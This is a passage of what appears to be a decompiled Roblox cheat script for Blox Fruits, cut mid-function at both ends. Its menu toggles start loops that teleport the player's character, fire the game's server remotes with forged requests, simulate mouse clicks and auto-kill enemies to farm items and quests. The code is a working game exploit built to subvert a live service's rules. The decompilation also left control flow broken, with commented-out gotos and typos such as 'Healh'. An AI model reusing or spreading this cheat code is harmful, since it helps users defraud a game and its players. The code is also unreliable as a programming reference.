                local v344, v345, v346 = pairs(plr.PlayerGui.Notifications:GetChildren())
                while true do
                    local v347
                    v346, v347 = v344(v345, v346)
                    if v346 == nil then
                        break
                    end
                    if v347.Name == "NotificationTemplate" and string.find(v347.Text, "Skill locked!") then
                        v347:Destroy()
                    end
                end
            end
        end)
    end)
end)
spawn(function()
	-- upvalues: (ref) vu15, (ref) vu28, (ref) vu16
    while wait(Sec) do
        if _G.FarmMastery_Dev then
            pcall(function()
				-- upvalues: (ref) vu15, (ref) vu28, (ref) vu16
                if SelectIsland ~= "Cake" then
                    if SelectIsland == "Bone" then
                        local v348 = GetConnectionEnemies(vu16)
                        if v348 then
                            HealthM = v348.Humanoid.MaxHealth * 70 / 100
                            repeat
                                wait()
                                MousePos = v348.HumanoidRootPart.Position
                                vu28.Mas(v348, _G.FarmMastery_Dev)
                            until _G.FarmMastery_Dev == false or (v348.Humanoid.Health <= 0 or not v348.Parent)
                        else
                            _tp(CFrame.new(- 9495.6806640625, 453.58624267578, 5977.3486328125))
                        end
                    end
                else
                    local v349 = GetConnectionEnemies(vu15)
                    if v349 then
                        HealthM = v349.Humanoid.MaxHealth * 70 / 100
                        repeat
                            wait()
                            MousePos = v349.HumanoidRootPart.Position
                            vu28.Mas(v349, _G.FarmMastery_Dev)
                        until _G.FarmMastery_Dev == false or (v349.Humanoid.Health <= 0 or not v349.Parent)
                    else
                        _tp(CFrame.new(- 1943.6765136719, 251.50956726074, - 12337.880859375))
                    end
                end
            end)
        end
    end
end)
v226.Main:AddToggle("MasteryGun", {
    ["Title"] = "Auto Mastery Gun",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p350)
    _G.FarmMastery_G = p350
end)
spawn(function()
	-- upvalues: (ref) vu15, (ref) vu28, (ref) vu16
    while wait(Sec) do
        if _G.FarmMastery_G then
            pcall(function()
				-- upvalues: (ref) vu15, (ref) vu28, (ref) vu16
                if SelectIsland == "Cake" then
                    local v351 = GetConnectionEnemies(vu15)
                    if v351 then
                        HealthM = v351.Humanoid.MaxHealth * 70 / 100
                        while true do
                            wait()
                            MousePos = v351.HumanoidRootPart.Position
                            vu28.Masgun(v351, _G.FarmMastery_G)
                            local v352 = replicated:FindFirstChild("Modules"):FindFirstChild("Net"):FindFirstChild("RE/ShootGunEvent")
                            if plr.Character:FindFirstChildOfClass("Tool").ToolTip ~= "Gun" then
                                return
                            end
                            if plr.Character:FindFirstChildOfClass("Tool") and plr.Character:FindFirstChildOfClass("Tool").Name == "Skull Guitar" then
                                SoulGuitar = true
                                plr.Character:FindFirstChildOfClass("Tool").RemoteEvent:FireServer("TAP", MousePos)
                                if _G.FarmMastery_G then
                                    vim1:SendMouseButtonEvent(0, 0, 0, true, game, 1)
                                    wait(0.05)
                                    vim1:SendMouseButtonEvent(0, 0, 0, false, game, 1)
                                    wait(0.05)
                                end
                            elseif plr.Character:FindFirstChildOfClass("Tool") and plr.Character:FindFirstChildOfClass("Tool").Name ~= "Skull Guitar" then
                                SoulGuitar = false
                                v352:FireServer(MousePos, {
                                    v351.HumanoidRootPart
                                })
                                if _G.FarmMastery_G then
                                    vim1:SendMouseButtonEvent(0, 0, 0, true, game, 1)
                                    wait(0.05)
                                    vim1:SendMouseButtonEvent(0, 0, 0, false, game, 1)
                                    wait(0.05)
                                end
                            end
                            if _G.FarmMastery_G == false or (v351.Humanoid.Health <= 0 or not v351.Parent) then
                                SoulGuitar = false
								-- goto l31
                            end
                        end
                    end
                    _tp(CFrame.new(- 1943.6765136719, 251.50956726074, - 12337.880859375))
					-- goto l31
                end
                if SelectIsland == "Bone" then
                    local v353 = GetConnectionEnemies(vu16)
                    if v353 then
                        HealthM = v353.Humanoid.MaxHealth * 70 / 100
                        while true do
                            wait()
                            MousePos = v353.HumanoidRootPart.Position
                            vu28.Masgun(v353, _G.FarmMastery_G)
                            local v354 = replicated:FindFirstChild("Modules"):FindFirstChild("Net"):FindFirstChild("RE/ShootGunEvent")
                            if plr.Character:FindFirstChildOfClass("Tool").ToolTip ~= "Gun" then
                                return
                            end
                            if plr.Character:FindFirstChildOfClass("Tool") and plr.Character:FindFirstChildOfClass("Tool").Name == "Skull Guitar" then
                                SoulGuitar = true
                                plr.Character:FindFirstChildOfClass("Tool").RemoteEvent:FireServer("TAP", MousePos)
                                if _G.FarmMastery_G then
                                    vim1:SendMouseButtonEvent(0, 0, 0, true, game, 1)
                                    wait(0.05)
                                    vim1:SendMouseButtonEvent(0, 0, 0, false, game, 1)
                                    wait(0.05)
                                end
                            elseif plr.Character:FindFirstChildOfClass("Tool") and plr.Character:FindFirstChildOfClass("Tool").Name ~= "Skull Guitar" then
                                SoulGuitar = false
                                v354:FireServer(MousePos, {
                                    v353.HumanoidRootPart
                                })
                                if _G.FarmMastery_G then
                                    vim1:SendMouseButtonEvent(0, 0, 0, true, game, 1)
                                    wait(0.05)
                                    vim1:SendMouseButtonEvent(0, 0, 0, false, game, 1)
                                    wait(0.05)
                                end
                            end
                            if _G.FarmMastery_G == false or (v353.Humanoid.Health <= 0 or not v353.Parent) then
                                SoulGuitar = false
								-- goto l31
                            end
                        end
                    end
                    _tp(CFrame.new(- 9495.6806640625, 453.58624267578, 5977.3486328125))
                end
				-- ::l31::
            end)
        end
    end
end)
v226.Main:AddToggle("MasterySword", {
    ["Title"] = "Auto Mastery All Sword",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p355)
    _G.FarmMastery_S = p355
end)
spawn(function()
	-- upvalues: (ref) vu15, (ref) vu28, (ref) vu16
    while wait(Sec) do
        pcall(function()
			-- upvalues: (ref) vu15, (ref) vu28, (ref) vu16
            if _G.FarmMastery_S then
                if SelectIsland ~= "Cake" then
                    if SelectIsland == "Bone" then
                        local v356 = next
                        local v357, v358 = replicated.Remotes.CommF_:InvokeServer("getInventory")
                        while true do
                            local v359
                            v358, v359 = v356(v357, v358)
                            if v358 == nil then
                                break
                            end
                            if type(v359) == "table" and v359.Type == "Sword" then
                                SwordName = v359.Name
                                if tonumber(v359.Mastery) >= 1 or tonumber(v359.Mastery) <= 599 then
                                    local v360 = GetConnectionEnemies(vu16)
                                    if GetBP(SwordName) then
                                        if v360 then
                                            wait()
                                            vu28.Sword(v360, _G.FarmMastery_S)
                                            if _G.FarmMastery_S == false or (not v360.Parent or v360.Humanoid.Healh <= 0) then
                                                break
                                            end
                                        end
                                        _tp(CFrame.new(- 9495.6806640625, 453.58624267578, 5977.3486328125))
                                        break
                                    else
                                        replicated.Remotes.CommF_:InvokeServer("LoadItem", SwordName)
                                        break
                                    end
                                else
                                    if tonumber(v359.Mastery) >= 600 then
                                        if GetBP(SwordName) then
                                            return nil
                                        end
                                        replicated.Remotes.CommF_:InvokeServer("LoadItem", SwordName)
                                    end
                                    break
                                end
                            end
                        end
                    end
                else
                    local v361 = next
                    local v362, v363 = replicated.Remotes.CommF_:InvokeServer("getInventory")
                    while true do
                        local v364
                        v363, v364 = v361(v362, v363)
                        if v363 == nil then
                            break
                        end
                        if type(v364) == "table" and v364.Type == "Sword" then
                            SwordName = v364.Name
                            if tonumber(v364.Mastery) >= 1 or tonumber(v364.Mastery) <= 599 then
                                local v365 = GetConnectionEnemies(vu15)
                                if GetBP(SwordName) then
                                    if v365 then
                                        repeat
                                            wait()
                                            vu28.Sword(v365, _G.FarmMastery_S)
                                        until _G.FarmMastery_S == false or (not v365.Parent or v365.Humanoid.Healh <= 0)
                                    else
                                        _tp(CFrame.new(- 1943.6765136719, 251.50956726074, - 12337.880859375))
                                    end
                                else
                                    replicated.Remotes.CommF_:InvokeServer("LoadItem", SwordName)
                                end
                            elseif tonumber(v364.Mastery) >= 600 then
                                if GetBP(SwordName) then
                                    return nil
                                end
                                replicated.Remotes.CommF_:InvokeServer("LoadItem", SwordName)
                            end
                            break
                        end
                    end
                end
            end
        end)
    end
end)
v226.Main:AddSection("Generals Quests / Items")
local vu366 = v226.Main:AddParagraph({
    ["Title"] = "Cake Princes :",
    ["Content"] = ""
})
spawn(function()
	-- upvalues: (ref) vu366
    while wait(0.2) do
        pcall(function()
			-- upvalues: (ref) vu366
            local v367 = string.match(replicated.Remotes.CommF_:InvokeServer("CakePrinceSpawner"), "%d+")
            if v367 then
                vu366:SetDesc(" Killed : " .. 500 - v367)
            end
        end)
    end
end)
local vu368 = v226.Main:AddParagraph({
    ["Title"] = " Bones :",
    ["Content"] = ""
})
spawn(function()
	-- upvalues: (ref) vu368
    while wait(0.2) do
        pcall(function()
			-- upvalues: (ref) vu368
            vu368:SetDesc(" Bones : " .. GetM("Bones"))
        end)
    end
end)
v226.Main:AddToggle("Q", {
    ["Title"] = "Auto Cake Prince",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p369)
    _G.Auto_Cake_Prince = p369
end)
spawn(function()
	-- upvalues: (ref) vu28
    while wait() do
        if _G.Auto_Cake_Prince then
            pcall(function()
				-- upvalues: (ref) vu28
                local v370 = game.Players.LocalPlayer
                local v371 = v370.Character
                if v371 then
                    v371 = v370.Character:FindFirstChild("HumanoidRootPart")
                end
                local v372 = v370.PlayerGui.Main.Quest
                local v373 = workspace.Enemies
                local v374 = workspace.Map.CakeLoaf.BigMirror
                if not v371 then
                    return
                end
                if not v374:FindFirstChild("Other") then
                    _tp(CFrame.new(- 2077, 252, - 12373))
                end
                if v374.Other.Transparency == 0 or v373:FindFirstChild("Cake Prince") then
                    local v375 = GetConnectionEnemies("Cake Prince")
                    if v375 then
                        wait()
                        vu28.Kill2(v375, _G.Auto_Cake_Prince)
                        if not _G.Auto_Cake_Prince or (not v375.Parent or v375.Humanoid.Health <= 0) then
							-- goto l20
                        end
                    end
                    if v374.Other.Transparency == 0 and (CFrame.new(- 1990.67, 4533, - 14973.67).Position - v371.Position).Magnitude >= 2000 then
                        _tp(CFrame.new(- 2151.82, 149.32, - 12404.91))
                    end
					-- goto l20
                end
                local v376 = GetConnectionEnemies({
                    "Cookie Crafter",
                    "Cake Guard",
                    "Baking Staff",
                    "Head Baker"
                })
                if v376 then
                    if _G.AcceptQuestC and not v372.Visible then
                        local v377 = CFrame.new(- 1927.92, 37.8, - 12842.54)
                        _tp(v377)
                        while (v377.Position - v371.Position).Magnitude > 50 do
                            wait(0.2)
                        end
                        local vu378 = math.random(1, 4)
                        local vu379 = {
                            {
                                "StartQuest",
                                "CakeQuest2",
                                2
                            },
                            {
                                "StartQuest",
                                "CakeQuest2",
                                1
                            },
                            {
                                "StartQuest",
                                "CakeQuest1",
                                1
                            },
                            {
                                "StartQuest",
                                "CakeQuest1",
                                2
                            }
                        }
                        local _, _ = pcall(function()
							-- upvalues: (ref) vu379, (ref) vu378
                            return game.ReplicatedStorage.Remotes.CommF_:InvokeServer(unpack(vu379[vu378]))
                        end)
                    end
                    while true do
                        wait()
                        vu28.Kill(v376, _G.Auto_Cake_Prince)
                        if not _G.Auto_Cake_Prince or (v376.Humanoid.Health <= 0 or v374.Other.Transparency == 0) then
							-- goto l20
                        end
                        if _G.AcceptQuestC then
                            if not v372.Visible then
                                break
                            end
							-- goto l30
                        end
                    end
                else
					-- ::l30::
                    _tp(CFrame.new(- 2077, 252, - 12373))
					-- ::l20::
                    return
                end
            end)
        end
    end
end)
v226.Main:AddToggle("Q", {
    ["Title"] = "Auto Bones",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p380)
    _G.AutoFarm_Bone = p380
end)
spawn(function()
	-- upvalues: (ref) vu28
    while wait(Sec) do
        if _G.AutoFarm_Bone then
            pcall(function()
				-- upvalues: (ref) vu28
                local v381 = game.Players.LocalPlayer
                local v382 = v381.Character
                if v382 then
                    v382 = v381.Character:FindFirstChild("HumanoidRootPart")
                end
                local v383 = v381.PlayerGui.Main.Quest
                local v384 = {
                    "Reborn Skeleton",
                    "Living Zombie",
                    "Demonic Soul",
                    "Posessed Mummy"
                }
                if not v382 then
                    return
                end
                local v385 = GetConnectionEnemies(v384)
                if v385 then
                    if _G.AcceptQuestC and not v383.Visible then
                        local v386 = CFrame.new(- 9516.99316, 172.017181, 6078.46533, 0, 0, - 1, 0, 1, 0, 1, 0, 0)
                        _tp(v386)
                        while (v386.Position - v382.Position).Magnitude > 50 do
                            wait(0.2)
                        end
                        local vu387 = math.random(1, 4)
                        local vu388 = {
                            {
                                "StartQuest",
                                "HauntedQuest2",
                                2
                            },
                            {
                                "StartQuest",
                                "HauntedQuest2",
                                1
                            },
                            {
                                "StartQuest",
                                "HauntedQuest1",
                                1
                            },
                            {
                                "StartQuest",
                                "HauntedQuest1",
                                2
                            }
                        }
                        local _, _ = pcall(function()
							-- upvalues: (ref) vu388, (ref) vu387
                            return game.ReplicatedStorage.Remotes.CommF_:InvokeServer(unpack(vu388[vu387]))
                        end)
                    end
                    while true do
                        task.wait()
                        vu28.Kill(v385, _G.AutoFarm_Bone)
                        if not _G.AutoFarm_Bone or (v385.Humanoid.Health <= 0 or not v385.Parent) then
							-- goto l21
                        end
                        if _G.AcceptQuestC then
                            if not v383.Visible then
                                break
                            end
							-- goto l9
                        end
                    end
                else
					-- ::l9::
                    _tp(CFrame.new(- 9495.6806640625, 453.58624267578, 5977.3486328125))
					-- ::l21::
                    return
                end
            end)
        end
    end
end)
v226.Main:AddToggle("Q", {
    ["Title"] = "Accept Quests",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p389)
    _G.AcceptQuestC = p389
end)
v226.Main:AddToggle("Q", {
    ["Title"] = "Auto Farm Mirror",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p390)
    _G.AutoMiror = p390
end)
spawn(function()
	-- upvalues: (ref) vu28
    while wait(Sec) do
        if _G.AutoMiror then
            pcall(function()
				-- upvalues: (ref) vu28
                local v391 = GetConnectionEnemies("Dough King")
                if v391 then
                    wait()
                    vu28.Kill(v391, _G.AutoMiror)
                    if not _G.AutoMiror or (not v391.Parent or v391.Humanoid.Health <= 0) then
						-- goto l6
                    end
                end
                _tp(CFrame.new(- 1943.6765136719, 251.50956726074, - 12337.880859375))
				-- ::l6::
            end)
        end
    end
end)
v226.Main:AddToggle("Q", {
    ["Title"] = "Auto Soul Reaper [Fully]",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p392)
    _G.AutoHytHallow = p392
end)
spawn(function()
	-- upvalues: (ref) vu28
    while wait(Sec) do
        if _G.AutoHytHallow then
            pcall(function()
				-- upvalues: (ref) vu28
                local v393 = GetConnectionEnemies("Soul Reaper")
                if v393 then
                    task.wait()
                    vu28.Kill(v393, _G.AutoHytHallow)
                    if v393.Humanoid.Health <= 0 or _G.AutoHytHallow == false then
						-- goto l6
                    end
                end
                if GetBP("Hallow Essence") then
                    repeat
                        wait(0.1)
                        _tp(CFrame.new(- 8932.322265625, 146.83154296875, 6062.55078125))
                    until _G.AutoHytHallow == false or plr.Character.HumanoidRootPart.CFrame == CFrame.new(- 8932.322265625, 146.83154296875, 6062.55078125)
                    EquipWeapon("Hallow Essence")
                else
                    repeat
                        task.wait(0.1)
                        replicated.Remotes.CommF_:InvokeServer("Bones", "Buy", 1, 1)
                    until _G.AutoHytHallow == false or GetBP("Hallow Essence")
                end
				-- ::l6::
            end)
        end
    end
end)
v226.Main:AddToggle("Q", {
    ["Title"] = "Auto Random Bones",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p394)
    _G.Auto_Random_Bone = p394
end)
spawn(function()
    while wait(Sec) do
        pcall(function()
            if _G.Auto_Random_Bone then
                repeat
                    task.wait()
                    replicated.Remotes.CommF_:InvokeServer("Bones", "Buy", 1, 1)
                until not _G.Auto_Random_Bone
            end
        end)
    end
end)
v226.Main:AddToggle("Q", {
    ["Title"] = "Auto Try Luck Gravestone",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p395)
    _G.TryLucky = p395
end)
spawn(function()
    while wait(Sec) do
        if _G.TryLucky then
            local v396 = CFrame.new(- 8761.3154296875, 164.85829162598, 6161.1567382813)
            if plr.Character.HumanoidRootPart.CFrame == v396 then
                if plr.Character.HumanoidRootPart.CFrame == v396 then
                    replicated.Remotes.CommF_:InvokeServer("gravestoneEvent", 1)
                end
            else
                _tp(CFrame.new(- 8761.3154296875, 164.85829162598, 6161.1567382813))
            end
        end
    end
end)
v226.Main:AddToggle("Q", {
    ["Title"] = "Auto Pray Gravestone",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p397)
    _G.Praying = p397
end)
spawn(function()
    while wait(Sec) do
        if _G.Praying then
            local v398 = CFrame.new(- 8761.3154296875, 164.85829162598, 6161.1567382813)
            if plr.Character.HumanoidRootPart.CFrame == v398 then
                if plr.Character.HumanoidRootPart.CFrame == v398 then
                    replicated.Remotes.CommF_:InvokeServer("gravestoneEvent", 2)
                end
            else
                _tp(CFrame.new(- 8761.3154296875, 164.85829162598, 6161.1567382813))
            end
        end
    end
end)
v226.Main:AddSection("Unlocked Dungeon")
v226.Main:AddToggle("Q", {
    ["Title"] = "Auto Unlock Dough dungeon",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p399)
    _G.Doughv2 = p399
end)
spawn(function()
	-- upvalues: (ref) vu28
    while wait(Sec) do
        if _G.Doughv2 then
            pcall(function()
				-- upvalues: (ref) vu28
                if workspace.Map.CakeLoaf:FindFirstChild("RedDoor") then
                    if workspace.Map.CakeLoaf:FindFirstChild("RedDoor") then
                        if GetBP("Red Key") then
                            repeat
                                wait()
                                _tp(CFrame.new(- 2681.97998, 64.3921585, - 12853.7363, 0.149007782, - 1.87902192e-8, 0.98883605, 3.60619588e-8, 1, 1.35681812e-8, - 0.98883605, 3.36376011e-8, 0.149007782))
                            until not _G.Doughv2 or (plr.Character.HumanoidRootPart.CFrame - CFrame.new(- 2681.97998, 64.3921585, - 12853.7363, 0.149007782, - 1.87902192e-8, 0.98883605, 3.60619588e-8, 1, 1.35681812e-8, - 0.98883605, 3.36376011e-8, 0.149007782)).Magnitude <= 5
                            EquipWeapon("Red Key")
                        end
                    elseif GetConnectionEnemies("Dough King") then
                        local v400 = GetConnectionEnemies("Dough King")
                        if v400 then
                            repeat
                                wait()
                                vu28.Kill(v400, _G.Doughv2)
                            until not _G.Doughv2 or (not v400.Parent or v400.Humanoid.Health <= 0)
                        else
                            _tp(CFrame.new(- 1943.6765136719, 251.50956726074, - 12337.880859375))
                        end
                    end
                elseif GetBP("Red Key") then
                    replicated.Remotes.CommF_:InvokeServer("CakeScientist", "Check")
                    replicated.Remotes.CommF_:InvokeServer("RaidsNpc", "Check")
                end
                if GetBP("Sweet Chalice") then
                    replicated.Remotes.CommF_:InvokeServer("CakePrinceSpawner", true)
                    _G.AutoMiror = true
                else
                    _G.AutoMiror = false
                end
                if GetBP("God\'s Chalice") and GetM("Conjured Cocoa") >= 10 then
                    replicated.Remotes.CommF_:InvokeServer("SweetChaliceNpc")
                end
                if plr.Backpack:FindFirstChild("God\'s Chalice") and not plr.Character:FindFirstChild("God\'s Chalice") then
                    _G.FarmEliteHunt = false
                else
                    _G.FarmEliteHunt = true
                end
                if GetM("Conjured Cocoa") <= 10 then
                    local v401 = GetConnectionEnemies({
                        "Cocoa Warrior",
                        "Chocolate Bar Battler"
                    })
                    if v401 then
                        repeat
                            wait()
                            vu28.Kill(v401, _G.Doughv2)
                        until _G.Doughv2 == false or (not v401.Parent or v401.Humanoid.Health <= 0)
                    else
                        _tp(CFrame.new(402.71890258789, 81.060501098633, - 12259.54296875))
                    end
                end
            end)
        end
    end
end)
v226.Main:AddToggle("Q", {
    ["Title"] = "Auto Unlock Phoenix dungeon",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p402)
    _G.AutoPhoenixF = p402
end)
spawn(function()
    while wait(0.1) do
        if _G.AutoPhoenixF then
            pcall(function()
                if GetBP("Bird-Bird: Phoenix") then
                    if plr.Backpack:FindFirstChild(plr.Data.DevilFruit.Value) then
                        if plr.Backpack:FindFirstChild(plr.Data.DevilFruit.Value).Level.Value >= 400 then
                            _tp(CFrame.new(- 2812.7670898438, 254.80346679688, - 12595.560546875))
                            if (CFrame.new(- 2812.7670898438, 254.80346679688, - 12595.560546875).Position - plr.Character.HumanoidRootPart.Position).Magnitude <= 10 then
                                replicated.Remotes.CommF_:InvokeServer("SickScientist", "Check")
                                replicated.Remotes.CommF_:InvokeServer("SickScientist", "Heal")
                            end
                        end
                    elseif plr.Character:FindFirstChild(plr.Data.DevilFruit.Value) and plr.Character:FindFirstChild(plr.Data.DevilFruit.Value).Level.Value >= 400 then
                        _tp(CFrame.new(- 2812.7670898438, 254.80346679688, - 12595.560546875))
                        if (CFrame.new(- 2812.7670898438, 254.80346679688, - 12595.560546875).Position - plr.Character.HumanoidRootPart.Position).Magnitude <= 10 then
                            replicated.Remotes.CommF_:InvokeServer("SickScientist", "Check")
                            replicated.Remotes.CommF_:InvokeServer("SickScientist", "Heal")
                        end
                    end
                end
            end)
        end
    end
end)
v226.Main:AddSection("Buso/Aura Colours")
v226.Main:AddToggle("Q", {
    ["Title"] = "Auto Teleport Barista Cousin",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p403)
    _G.Tp_MasterA = p403
end)
spawn(function()
    while wait() do
        if _G.Tp_MasterA then
            pcall(function()
                local v404, v405, v406 = pairs(replicated.NPCs:GetChildren())
                while true do
                    local v407
                    v406, v407 = v404(v405, v406)
                    if v406 == nil then
                        break
                    end
                    if v407.Name == "Barista Cousin" then
                        _tp(v407.HumanoidRootPart.CFrame)
                    end
                end
            end)
        end
    end
end)
v226.Main:AddButton({
    ["Title"] = "Buy Buso Colors",
    ["Description"] = "",
    ["Callback"] = function()
        replicated.Remotes.CommF_:InvokeServer("ColorsDealer", "2")
    end
})
v226.Main:AddToggle("Q", {
    ["Title"] = "Auto Rainbow Colors",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p408)
    _G.Auto_Rainbow_Haki = p408
end)
spawn(function()
	-- upvalues: (ref) vu28
    pcall(function()
		-- upvalues: (ref) vu28
        while true do
            if not wait(Sec) then
                return
            end
            if _G.Auto_Rainbow_Haki then
                if plr.PlayerGui.Main.Quest.Visible ~= false then
                    if plr.PlayerGui.Main.Quest.Visible ~= true or not string.find(plr.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "Stone") then
                        if plr.PlayerGui.Main.Quest.Visible ~= true or not string.find(plr.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "Hydra Leader") then
                            if plr.PlayerGui.Main.Quest.Visible ~= true or not string.find(plr.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "Kilo Admiral") then
                                if plr.PlayerGui.Main.Quest.Visible ~= true or not string.find(plr.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "Captain Elephant") then
                                    if plr.PlayerGui.Main.Quest.Visible == true and string.find(plr.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "Beautiful Pirate") then
                                        local v409 = GetConnectionEnemies("Captain Elephant")
                                        if v409 then
                                            task.wait()
                                            vu28.Kill(v409, _G.Auto_Rainbow_Haki)
                                            if _G.Auto_Rainbow_Haki ~= false and (v409.Humanoid.Health > 0 and (v409.Parent and plr.PlayerGui.Main.Quest.Visible ~= false)) then
												-- goto l96
                                            end
                                        else
											-- ::l96::
                                            replicated.Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(5314.5463867188, 22.562219619751, - 127.06755065918))
                                        end
                                    end
                                else
                                    local v410 = GetConnectionEnemies("Captain Elephant")
                                    if v410 then
                                        repeat
                                            task.wait()
                                            vu28.Kill(v410, _G.Auto_Rainbow_Haki)
                                        until _G.Auto_Rainbow_Haki == false or (v410.Humanoid.Health <= 0 or (not v410.Parent or plr.PlayerGui.Main.Quest.Visible == false))
                                    else
                                        local v411 = Vector3.new(- 12471.169921875, 374.94024658203, - 7551.677734375)
                                        local v412 = CFrame.new(- 13376.7578125, 433.28689575195, - 8071.392578125)
                                        if plr.Character.HumanoidRootPart.CFrame.Position == v411 then
                                            if plr.Character.HumanoidRootPart.CFrame.Position == v411 then
                                                _tp(v412)
                                            end
                                        else
                                            replicated.Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(- 12471.169921875, 374.94024658203, - 7551.677734375))
                                        end
                                    end
                                end
                            else
                                local v413 = GetConnectionEnemies("Kilo Admiral")
                                if v413 then
                                    repeat
                                        task.wait()
                                        vu28.Kill(v413, _G.Auto_Rainbow_Haki)
                                    until _G.Auto_Rainbow_Haki == false or (v413.Humanoid.Health <= 0 or (not v413.Parent or plr.PlayerGui.Main.Quest.Visible == false))
                                else
                                    _tp(CFrame.new(2877.61743, 423.558685, - 7207.31006, - 0.989591599, 0, - 0.143904909, 0, 1.00000012, 0, 0.143904924, 0, - 0.989591479))
                                end
                            end
                        else
                            local v414 = GetConnectionEnemies("Hydra Leader")
                            if v414 then
                                repeat
                                    task.wait()
                                    vu28.Kill(v414, _G.Auto_Rainbow_Haki)
                                until _G.Auto_Rainbow_Haki == false or (v414.Humanoid.Health <= 0 or (not v414.Parent or plr.PlayerGui.Main.Quest.Visible == false))
                            else
                                replicated.Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(5643.4526367188, 1013.0858154297, - 340.51025390625))
                                local v415 = Vector3.new(5643.4526367188, 1013.0858154297, - 340.51025390625)
                                local v416 = CFrame.new(5821.8979492188, 1019.0950927734, - 73.719230651855)
                                if plr.Character.HumanoidRootPart.CFrame.Position == v415 then
                                    _tp(v416)
                                end
                            end
                        end
                    else
                        local v417 = GetConnectionEnemies("Stone")
                        if v417 then
                            repeat
                                wait()
                                vu28.Kill(v417, _G.Auto_Rainbow_Haki)
                            until _G.Auto_Rainbow_Haki == false or (v417.Humanoid.Health <= 0 or (not v417.Parent or plr.PlayerGui.Main.Quest.Visible == false))
                        else
                            _tp(CFrame.new(- 1086.11621, 38.8425903, 6768.71436, 0.0231462717, - 0.592676699, 0.805107772, 0.0000203251839, 0.805323839, 0.592835128, - 0.999732077, - 0.0137055516, 0.0186523199))
                        end
                    end
                elseif _G.GetQFast then
                    if plr.PlayerGui.Main.Quest.Visible == false then
                        replicated.Remotes.CommF_:InvokeServer("HornedMan", "Bet")
                    end
                else
                    Rainbow1 = CFrame.new(- 11892.0703125, 930.57672119141, - 8760.1591796875)
                    if plr.Character.HumanoidRootPart.CFrame == Rainbow1 then
                        if plr.Character.HumanoidRootPart.CFrame == Rainbow1 then
                            wait(1)
                            replicated.Remotes.CommF_:InvokeServer("HornedMan", "Bet")
                        end
                    else
                        _tp(Rainbow1)
                    end
                end
            end
        end
    end)
end)
v226.Main:AddToggle("Q", {
    ["Title"] = "Accept Rainbow Quest Faster",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p418)
    _G.GetQFast = p418
end)
v226.Main:AddSection("Instinct / Observation")
v226.Main:AddToggle("Q", {
    ["Title"] = "Auto Farm Observation",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p419)
    _G.obsFarm = p419
end)
spawn(function()
    while wait(0.2) do
        pcall(function()
            if _G.obsFarm then
                replicated.Remotes.CommE:FireServer("Ken", true)
                if plr:GetAttribute("KenDodgesLeft") ~= 0 then
                    if plr:GetAttribute("KenDodgesLeft") > 0 then
                        replicated.Remotes.CommE:FireServer("Ken", true)
                        KenTest = true
                    end
                else
                    KenTest = false
                end
            end
        end)
    end
end)
spawn(function()
    while wait(0.2) do
        pcall(function()
            if _G.obsFarm then
                if World1 then
                    if workspace.Enemies:FindFirstChild("Galley Captain") then
                        if KenTest then
                            repeat
                                wait()
                                plr.Character.HumanoidRootPart.CFrame = workspace.Enemies:FindFirstChild("Galley Captain").HumanoidRootPart.CFrame * CFrame.new(3, 0, 0)
                            until _G.obsFarm == false or KenTest == false
                        else
                            repeat
                                wait()
                                plr.Character.HumanoidRootPart.CFrame = workspace.Enemies:FindFirstChild("Galley Captain").HumanoidRootPart.CFrame * CFrame.new(0, 50, 0)
                            until _G.obsFarm == false or KenTest
                        end
                    else
                        _tp(CFrame.new(5533.29785, 88.1079102, 4852.3916))
                    end
					-- goto l3
                end
                if World2 then
                    if workspace.Enemies:FindFirstChild("Lava Pirate") then
                        if KenTest then
                            repeat
                                wait()
                                plr.Character.HumanoidRootPart.CFrame = workspace.Enemies:FindFirstChild("Lava Pirate").HumanoidRootPart.CFrame * CFrame.new(3, 0, 0)
                            until _G.obsFarm == false or KenTest == false
							-- goto l3
                        end
                        wait()
                        plr.Character.HumanoidRootPart.CFrame = workspace.Enemies:FindFirstChild("Lava Pirate").HumanoidRootPart.CFrame * CFrame.new(0, 50, 0)
                        if _G.obsFarm ~= false and not KenTest then
							-- goto l26
                        end
                    else
						-- ::l26::
                        _tp(CFrame.new(- 5478.39209, 15.9775667, - 5246.9126))
                    end
					-- goto l3
                end
                if not World3 then
					-- goto l3
                end
                if workspace.Enemies:FindFirstChild("Venomous Assailant") then
                    if KenTest then
                        wait()
                        _tp(workspace.Enemies:FindFirstChild("Venomous Assailant").HumanoidRootPart.CFrame * CFrame.new(3, 0, 0))
                        if _G.obsFarm == false or KenTest == false then
							-- goto l3
                        end
                    end
                    wait()
                    _tp(workspace.Enemies:FindFirstChild("Venomous Assailant").HumanoidRootPart.CFrame * CFrame.new(0, 50, 0))
                    if _G.obsFarm ~= false and not KenTest then
						-- goto l41
                    end
                else
					-- ::l41::
                    _tp(CFrame.new(4530.3540039063, 656.75695800781, - 131.60952758789))
                end
            end
			-- ::l3::
        end)
    end
end)
v226.Main:AddToggle("Q", {
    ["Title"] = "Auto Observation V2",
    ["Description"] = "",
    ["Default"] = false
}):OnChanged(function(p420)
    _G.AutoKenVTWO = p420
end)
spawn(function()
	-- upvalues: (ref) vu28
    while wait(Sec) do
        if _G.AutoKenVTWO then
            pcall(function()
				-- upvalues: (ref) vu28
